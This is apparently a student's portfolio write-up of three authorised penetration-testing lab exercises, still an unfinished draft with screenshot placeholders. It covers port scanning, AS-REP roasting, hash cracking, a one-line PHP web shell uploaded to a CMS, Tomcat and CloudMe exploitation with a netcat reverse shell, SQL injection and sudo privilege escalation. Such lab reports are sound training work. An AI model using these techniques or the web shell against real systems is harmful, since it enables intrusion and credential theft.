# Practical Penetration Testing Lab

## Project Overview

This project documents a series of practical penetration-testing exercises completed within an authorised EC-Council iLabs environment as part of my Systems Penetration Testing studies.

The work provided hands-on experience across several stages of a penetration test, including:

- Host discovery
- Network scanning
- Service enumeration
- Operating system fingerprinting
- Active Directory enumeration
- Credential attacks
- Web application testing
- SQL injection
- Exploit research
- Remote command execution
- Windows privilege escalation
- Linux privilege escalation
- Post-exploitation

The project involved three separate target environments and demonstrated how individual weaknesses can be combined to create complete attack paths.

All testing was performed within an authorised laboratory environment.

---

# Penetration Testing Methodology

The exercises followed a structured testing process:

```text
Reconnaissance
      ↓
Host Discovery
      ↓
Port Scanning
      ↓
Service Enumeration
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Credential Recovery
      ↓
Privilege Escalation
      ↓
Post-Exploitation


One of the key lessons from this project was that successful penetration testing depends on correlating information from each stage rather than viewing vulnerabilities in isolation.

---

# Experience 1

## Windows, Active Directory and Web Application Testing

The first environment focused on identifying a Windows-based target, enumerating services and Active Directory information, recovering credentials and using a vulnerable web application to achieve remote command execution.

---

## 1. Full TCP Port Discovery

### Objective

The first stage was to identify the TCP services exposed by the target system and establish the initial attack surface.

### Technique

Nmap was used to scan all TCP ports:

```bash
nmap -p- 10.10.1.22
```

The `-p-` option instructs Nmap to scan all 65,535 TCP ports instead of only the default common ports

### Result

The scan identified several open ports associated with Windows networking and Active Directory services.

This information provided the foundation for more targeted service enumeration.

### Skills Demonstrated

- Full TCP port scanning
- Network reconnaissance
- Attack-surface identification
- Interpreting Nmap results

### Evidence

<img width="431" height="562" alt="Figure 1  Nmap full TCP port scan identifying open services on target 10 10 1 22" src="https://github.com/user-attachments/assets/8170dad5-52b4-46cc-b62b-72670107ba03" />

Figure 1. Nmap full TCP port scan identifying open services on target 10.10.1.22

## 2. Web Service Version Detection

### Objective

After identifying HTTP on port 80, I investigated the application and version running on the service.

### Technique

```bash
nmap -sV -p 80 10.10.1.22
```

The `-sV` option enables service version detection while `-p 80` restricts the scan to the HTTP service.

### Result

Nmap identified:

```text
Apache httpd 2.4.46
```

Identifying software versions is important because it allows a penetration tester to research configuration weaknesses and known vulnerabilities.

### Skills Demonstrated

- Service enumeration
- Version detection
- Targeted Nmap scanning
- Technology identification

### Evidence

<img width="635" height="201" alt="Figure 2  Nmap service version detection identifying Apache HTTP Server 2 4 46" src="https://github.com/user-attachments/assets/65852042-899c-470d-8ec7-23c9873d7f9f" />

Figure 2. Nmap service version detection identifying Apache HTTP Server 2.4.46

## 3. Operating System Fingerprinting

### Objective

The next stage was to identify the target operating system.

### Technique

```bash
nmap -O 10.10.1.22
```

The `-O` option enables Nmap operating system fingerprinting.

### Result

The scan indicated that the target was running:

```text
Microsoft Windows Server 2012 R2
```

The result was fingerprint-based and Nmap noted that the result may not have been fully reliable because the scan did not identify both an open and closed port.

### Skills Demonstrated

- OS fingerprinting
- Interpretation of scan confidence
- Windows infrastructure reconnaissance

### Screenshot

<img width="628" height="437" alt="Figure 3  Nmap operating system fingerprinting indicating Windows Server 2012 R2" src="https://github.com/user-attachments/assets/5963ae1d-f144-48df-bb87-6be086acb15d" />

Figure 3. Nmap operating system fingerprinting indicating Windows Server 2012 R2

## 4. Content Management System Identification

### Objective

The web service was investigated further to identify the Content Management System in use.

### Technique

```bash
nmap -p 80 --script http-generator 10.10.1.22
```

The Nmap Scripting Engine `http-generator` script checks a webpage for generator metadata.

### Result

The scan identified:

```text
Sitemagic CMS
```

This demonstrated how application-level information can be gathered using targeted NSE scripts.

### Skills Demonstrated

- Nmap Scripting Engine
- Web application enumeration
- CMS fingerprinting

### Screenshot

<img width="628" height="289" alt="Figure 4  Nmap NSE enumeration identifying the Sitemagic CMS platform" src="https://github.com/user-attachments/assets/d6296b07-3b05-4526-8fda-6d902e9ebe48" />

Figure 4. Nmap NSE enumeration identifying the Sitemagic CMS platform

## 5. SMB and Active Directory Enumeration

### Objective

SMB was investigated to gather more information about the Windows and Active Directory environment.

### Technique

```bash
nmap -p 445 --script smb-os-discovery 10.10.1.22
```

### Result

The output revealed:

```text
Computer name: Careless
Domain: CyberQ.local
FQDN: Careless.CyberQ.local
```

The Active Directory domain information became particularly useful during the credential attack performed later in the assessment.

### Skills Demonstrated

- SMB enumeration
- Active Directory reconnaissance
- Domain identification
- NSE scripting

### Screenshot

<img width="628" height="422" alt="Figure 5  SMB enumeration identifying the CyberQ local Active Directory domain" src="https://github.com/user-attachments/assets/09abba29-b08e-44be-b2a2-23fe369b3e9e" />

Figure 5. SMB enumeration identifying the CyberQ.local Active Directory domain

# 6. Kerberos AS-REP Roasting

### Objective

The Active Directory environment was assessed for accounts that did not require Kerberos pre-authentication.

### Technique

Impacket GetNPUsers was used:

```bash
impacket-GetNPUsers CyberQ.local/ -dc-ip 10.10.1.22 -request -format hashcat
```

The request returned an encrypted AS-REP response for a vulnerable account.

The resulting hash was then subjected to offline password cracking.

### Password Recovery

John the Ripper was used to inspect the cracked hash:

```bash
john --show hash.txt
```

### Result

The attack demonstrated how an Active Directory account configured without Kerberos pre-authentication may expose material that can be attacked offline.

### Skills Demonstrated

- Active Directory security testing
- Kerberos enumeration
- AS-REP roasting
- Offline password cracking
- Impacket
- John the Ripper

### Screenshot 1

<img width="628" height="161" alt="Figure 6  Impacket GetNPUsers retrieving an AS-REP hash from the target domain" src="https://github.com/user-attachments/assets/71cba542-c9bd-442d-b4b6-0d8d37128d03" />

Figure 6.1. Impacket GetNPUsers retrieving an AS-REP hash from the CyberQ.local Active Directory domain

<img width="503" height="190" alt="Screenshot 2026-09-11 at 15 26 58" src="https://github.com/user-attachments/assets/7bb351d1-0709-4e77-a10b-05ab87d45924" />

Figure 6.2. John the Ripper confirming successful offline password recovery from the retrieved AS-REP hashFigure 6. Impacket GetNPUsers retrieving an AS-REP hash from the target domain


# 7. Web Application Exploitation and Remote Command Execution

### Objective

Recovered credentials were used to access the Sitemagic CMS.

The application's file management functionality was then assessed within the authorised lab environment.

### Technique

A simple PHP command shell was created:

```php
<?php system($_GET['cmd']); ?>
```

The file was uploaded to the CMS under:

```text
/files/images/
```

A command was then executed through the uploaded PHP file.

### Verification

The Windows command:

```text
whoami
```

returned:

```text
nt authority\system
```

This demonstrated that the web application was capable of executing operating-system commands with extremely high privileges.

### Security Impact

This exercise demonstrated the combined risk created by:

- Weak credentials
- Insecure file upload functionality
- Server-side code execution
- Excessive web-server privileges

### Skills Demonstrated

- Web application testing
- Authenticated exploitation
- File upload vulnerabilities
- Remote command execution
- Windows privilege identification

### Screenshot(s)

<img width="632" height="493" alt="Screenshot 2026-09-11 at 15 35 25" src="https://github.com/user-attachments/assets/eb6b5f9a-320f-448c-b08a-f47e39999184" />

Figure 7.1. Sitemagic CMS web application identified on the target web server

<img width="457" height="232" alt="Figure 7 2  Authenticated access to the Sitemagic CMS using recovered credentials" src="https://github.com/user-attachments/assets/a17e6883-4d95-4a85-8529-f757ab2b5b07" />

Figure 7.2. Authenticated access to the Sitemagic CMS using recovered credentials

<img width="632" height="493" alt="Screenshot 2026-09-11 at 15 35 25" src="https://github.com/user-attachments/assets/9cde5c1b-ef4a-4a32-a693-6f4202a3ccd8" />

Figure 7.3. PHP command shell created in Kali for controlled remote command execution testing





# 8. Post-Exploitation

### Objective

The existing command execution capability was used to demonstrate access to protected system data.

### Technique

A Windows `type` command was issued against the Administrator desktop.

### Result

The test confirmed that the remote command execution capability could access files belonging to a privileged account.

This demonstrated the potential impact of the compromise beyond initial web application access.

### Skills Demonstrated

- Post-exploitation
- Windows file access
- Privilege validation
- Impact assessment

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 19, but crop out the OU question/answer interface.

Suggested caption:

> Post-exploitation access demonstrating retrieval of data from a privileged Windows account.

---

# Experience 2

## Windows Exploitation and Privilege Escalation

The second environment focused on Apache Tomcat, Metasploit exploitation, post-exploitation enumeration and Windows privilege escalation.

---

# 1. Open Port Discovery

### Technique

```bash
nmap -p- --open 10.10.1.24
```

The `--open` option restricted the output to confirmed open ports.

### Result

The scan identified:

```text
5985/tcp
8080/tcp
```

These results were used to focus subsequent enumeration on the exposed services.

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 21.

Suggested caption:

> Full TCP scan showing confirmed open services on the Windows lab target.

---

# 2. Apache Tomcat Enumeration

### Technique

```bash
nmap -sV -p 8080 10.10.1.24
```

### Result

The web service was identified as:

```text
Apache Tomcat 9.0.37
```

This information allowed more focused investigation of the Tomcat management interface.

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 23.

Suggested caption:

> Nmap service enumeration identifying Apache Tomcat 9.0.37 on TCP port 8080.

---

# 3. Tomcat Manager Exploitation

### Objective

The Tomcat Manager interface was assessed for weak authentication and exploitable functionality.

### Metasploit Research

The following command was used:

```text
search tomcat upload
```

This identified:

```text
exploit/multi/http/tomcat_mgr_upload
```

### Credential Testing

A Tomcat Manager login scanner identified valid default credentials.

The upload exploit was then configured with:

```text
RHOSTS
RPORT
TARGETURI
USERNAME
PASSWORD
```

### Result

The exploit successfully uploaded and executed a Java payload, producing a Meterpreter session.

The compromised account was identified as:

```text
cloud\jack
```

### Skills Demonstrated

- Metasploit
- Authentication testing
- Default credential identification
- Tomcat exploitation
- Meterpreter
- Remote access

### Screenshot 1

ADD SCREENSHOT HERE

Use your original Figure 30.

Suggested caption:

> Metasploit search identifying the Tomcat Manager upload module.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 32.

Suggested caption:

> Tomcat Manager authentication testing identifying valid default credentials.

### Screenshot 3

ADD SCREENSHOT HERE

Use Figure 33.

Suggested caption:

> Configured Metasploit Tomcat Manager exploitation module.

### Screenshot 4

ADD SCREENSHOT HERE

Use Figure 34.

Suggested caption:

> Successful Meterpreter session established following controlled Tomcat exploitation.

### Screenshot 5

ADD SCREENSHOT HERE

Use Figure 35.

Suggested caption:

> Post-exploitation enumeration confirming the compromised Windows user context.

---

# 4. Post-Exploitation File Access

Once a Meterpreter session had been established, the compromised system was searched for user-accessible data.

The Windows command:

```text
where /r C:\ user.txt
```

was used to locate the file.

The file could then be read through the established shell.

### Skills Demonstrated

- Post-exploitation
- Windows filesystem enumeration
- Remote shell operation

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 37.

Suggested caption:

> Post-exploitation file access through the established Meterpreter session.

---

# 5. Installed Software Enumeration

### Objective

The compromised system was inspected for locally installed software that might offer opportunities for further privilege escalation.

### Commands

```text
dir "C:\Program Files (x86)" /b | findstr /i cloudme
```

and:

```text
dir /s /b "C:\Program Files (x86)\CloudMe\*.txt"
```

The application licence file was inspected using:

```text
type
```

### Result

CloudMe Sync version:

```text
1.11.0
```

was identified.

### Screenshot 1

ADD SCREENSHOT HERE

Use Figure 39.

Suggested caption:

> Windows filesystem enumeration identifying the installed CloudMe application.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 40.

Suggested caption:

> Application version identification through inspection of CloudMe licence information.

---

# 6. Vulnerability Research with SearchSploit

### Objective

The identified software version was researched for publicly documented vulnerabilities.

### Technique

```bash
searchsploit cloudme
```

### Result

SearchSploit identified:

```text
CloudMe Sync 1.11.0 - Local Buffer Overflow
```

This demonstrated a typical vulnerability-research workflow:

```text
Application Discovery
        ↓
Version Identification
        ↓
Exploit Research
        ↓
Exploit Validation
```

### Skills Demonstrated

- Exploit research
- SearchSploit
- Version correlation
- Vulnerability identification

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 42.

Suggested caption:

> SearchSploit identifying a local buffer overflow affecting CloudMe Sync 1.11.0.

---

# 7. Windows Privilege Escalation

### Objective

The identified CloudMe vulnerability was used in the controlled laboratory environment to demonstrate vertical privilege escalation.

### Technique

A modified exploit containing a reverse-shell payload was prepared.

A Netcat listener was configured on Kali:

```bash
nc -lvnp 5555
```

The exploit was transferred to the compromised Windows host and executed.

### Result

A reverse connection was received.

The `whoami` command returned:

```text
cloud\administrator
```

This demonstrated successful vertical privilege escalation from:

```text
cloud\jack
```

to:

```text
cloud\administrator
```

### Skills Demonstrated

- Windows privilege escalation
- Exploit modification
- Reverse shells
- Netcat
- Payload generation
- Post-exploitation

### Screenshot 1

ADD SCREENSHOT HERE

Use Figure 44.

Suggested caption:

> CloudMe exploit preparation on the Kali attack system.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 45.

Suggested caption:

> Modified exploit containing the generated reverse-shell payload.

### Screenshot 3

ADD SCREENSHOT HERE

Use Figure 46.

Suggested caption:

> Netcat listener prepared to receive the reverse connection.

### Screenshot 4

ADD SCREENSHOT HERE

Use Figure 47.

Suggested caption:

> Exploit transferred to the compromised Windows system using the existing Meterpreter session.

### Screenshot 5

ADD SCREENSHOT HERE

Use Figure 48.

Suggested caption:

> Reverse shell successfully received with Administrator-level privileges.

---

# 8. Privileged Post-Exploitation

Administrator-level access allowed protected system resources to be accessed.

This confirmed that successful privilege escalation had significantly increased the impact of the original compromise.

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 51.

Suggested caption:

> Privileged post-exploitation access following successful Windows privilege escalation.

---

# Experience 3

## Linux, Web Application and SQL Injection Testing

The third environment combined network reconnaissance, SQL injection, credential recovery, SSH access and Linux privilege escalation.

---

# 1. Host Discovery

### Technique

The Kali attack machine address was first confirmed:

```bash
ip -br addr
```

The subnet was then scanned:

```bash
nmap -sn 10.10.1.0/24
```

The `-sn` option performs host discovery without a full port scan.

### Result

The target system was identified among the live hosts on the laboratory subnet.

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 53.

Suggested caption:

> Nmap host discovery identifying live systems within the authorised laboratory subnet.

---

# 2. Full TCP Port and Service Discovery

### Full Port Scan

```bash
nmap -p- 10.10.1.32
```

The scan identified:

```text
22/tcp
80/tcp
```

### Service Version Detection

```bash
nmap -sV -p 22,80 10.10.1.32
```

The resulting services included:

```text
OpenSSH 7.6p1
Apache httpd 2.4.29
```

### Screenshot 1

ADD SCREENSHOT HERE

Use Figure 54.

Suggested caption:

> Full TCP scan identifying SSH and HTTP services.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 55.

Suggested caption:

> Nmap service version detection identifying OpenSSH and Apache.

---

# 3. Web Application Parameter Testing

### Objective

The target web application was inspected for user-controlled parameters that could represent potential injection points.

A request included the parameter:

```text
pageid
```

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 61.

Suggested caption:

> Captured HTTP request identifying the `pageid` GET parameter for further testing.

---

# 4. SQL Injection Identification

### Technique

The HTTP request was saved and supplied to SQLMap:

```bash
sqlmap -r req.txt --batch
```

### Result

SQLMap confirmed that the `pageid` parameter was vulnerable to SQL injection.

Multiple techniques were identified, including:

- Boolean-based blind
- Error-based
- Time-based blind
- UNION query injection

The backend database was identified as MySQL.

### Skills Demonstrated

- Web application testing
- SQL injection testing
- SQLMap
- Request analysis
- Database fingerprinting

### Screenshot 1

ADD SCREENSHOT HERE

Use Figure 62.

Suggested caption:

> SQLMap testing the `pageid` GET parameter.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 63.

Suggested caption:

> SQLMap confirming multiple SQL injection techniques against the vulnerable parameter.

---

# 5. Database Enumeration and Credential Recovery

### Objective

The SQL injection vulnerability was used to enumerate database information and recover a password hash belonging to a system user.

The recovered hash was then subjected to offline analysis using Hashcat.

### Hashcat

Hashcat was configured for MD5:

```bash
hashcat -m 0 -a 3 <hash-file> <mask>
```

### Result

The recovered credentials were validated through SSH access.

This produced a complete attack path:

```text
Web Application
      ↓
SQL Injection
      ↓
Database Enumeration
      ↓
Password Hash Recovery
      ↓
Offline Password Cracking
      ↓
Valid Credentials
      ↓
SSH Access
```

### Skills Demonstrated

- Database enumeration
- Credential extraction
- Password hash cracking
- Hashcat
- Credential validation
- SSH

### Screenshot 1

ADD SCREENSHOT HERE

Use Figure 65.

Suggested caption:

> Hashcat configured to perform offline password recovery against the extracted MD5 hash.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 66.

Suggested caption:

> Successful password recovery using Hashcat.

### Screenshot 3

ADD SCREENSHOT HERE

Use Figure 67.

Suggested caption:

> Credentials validated through successful SSH authentication.

---

# 6. Linux System Enumeration

After authenticated SSH access was established, the system login banner revealed the operating system as:

```text
Ubuntu 18.04.4 LTS
```

This provided further context about the target environment and demonstrated how authenticated access can reveal information that may not always be available through remote fingerprinting.

### Screenshot

ADD SCREENSHOT HERE

Use your Experience 3 Challenge 6 SSH screenshot.

Suggested caption:

> Authenticated SSH session revealing the Ubuntu operating system version.

---

# 7. Linux Post-Exploitation

The filesystem was searched using:

```bash
find / -type f -name user.txt 2>/dev/null
```

The command recursively searches the filesystem while suppressing permission errors.

The discovered file was then inspected using:

```bash
cat /home/cyberq_user/user.txt
```

### Skills Demonstrated

- Linux filesystem enumeration
- Shell navigation
- Post-exploitation
- Command-line proficiency

### Screenshot

ADD SCREENSHOT HERE

Use your original Figure 71.

Suggested caption:

> Linux post-exploitation enumeration locating and reading the user-level target file.

---

# 8. Linux Privilege Escalation

### Objective

The compromised user's sudo privileges were examined.

### Technique

```bash
sudo -l
```

This revealed that the user was permitted to run:

```text
/bin/nano
```

with root privileges.

### Result

The overly permissive sudo rule allowed access to root-owned resources.

This demonstrated how poor sudo configuration can provide a direct vertical privilege-escalation route.

### Skills Demonstrated

- Linux privilege escalation
- Sudo enumeration
- Least-privilege assessment
- Linux permissions
- Post-exploitation

### Screenshot 1

ADD SCREENSHOT HERE

Use your original Figure 73.

Suggested caption:

> `sudo -l` revealing an overly permissive sudo configuration.

### Screenshot 2

ADD SCREENSHOT HERE

Use Figure 74.

Suggested caption:

> Root-level file access demonstrating successful Linux privilege escalation.

---

# Tools Used

| Tool | Purpose |
|---|---|
| Kali Linux | Penetration-testing platform |
| Nmap | Host, port, service and OS discovery |
| Nmap NSE | Web, SMB and application enumeration |
| Impacket | Active Directory and Kerberos testing |
| John the Ripper | Offline password recovery |
| Metasploit | Exploitation and payload management |
| Meterpreter | Post-exploitation |
| SearchSploit | Vulnerability and exploit research |
| msfvenom | Payload generation |
| Netcat | Reverse-shell listener |
| SQLMap | SQL injection identification and exploitation |
| Hashcat | Password hash recovery |
| SSH | Authenticated remote access |
| Linux CLI | Enumeration and privilege escalation |

---

# Skills Developed

This project developed practical experience in:

- Network reconnaissance
- Host discovery
- TCP port scanning
- Service version detection
- Operating system fingerprinting
- Web application enumeration
- Active Directory enumeration
- Kerberos security testing
- Password attacks
- Exploit research
- Vulnerability exploitation
- SQL injection
- Database enumeration
- Windows post-exploitation
- Linux post-exploitation
- Windows privilege escalation
- Linux privilege escalation
- Remote command execution
- Technical evidence collection
- Penetration-test reporting

---

# Key Learning

This project strengthened my understanding that penetration testing is not simply a collection of individual tools or commands.

The strongest attack paths developed when information collected during one phase was used to inform the next.

For example:

```text
Port Discovery
      ↓
Service Enumeration
      ↓
Active Directory Discovery
      ↓
Authentication Weakness
      ↓
Credential Recovery
      ↓
Web Application Access
      ↓
Remote Command Execution
```

Another environment demonstrated:

```text
SQL Injection
      ↓
Database Enumeration
      ↓
Password Hash Recovery
      ↓
Credential Cracking
      ↓
SSH Access
      ↓
Linux Privilege Escalation
```

These exercises helped me understand how relatively small weaknesses can combine to create significant organisational risk.

They also reinforced the importance of maintaining detailed evidence throughout a penetration test, including command output, screenshots and clear technical explanations. 

---

# Ethical Use

All penetration-testing activity documented in this repository was performed within an authorised EC-Council iLabs training environment.

The material is presented solely to demonstrate my practical cyber security learning and professional development.

The techniques shown should only be used against systems where explicit permission to conduct security testing has been granted.

---

# About This Portfolio Project

This project forms part of my continuing development towards a career in penetration testing and offensive security.

I am particularly interested in understanding not only how vulnerabilities can be identified and exploited, but how individual technical weaknesses combine to create wider organisational risk.

My ongoing development includes practical laboratory work, independent security projects and continued study of network, infrastructure and application security.
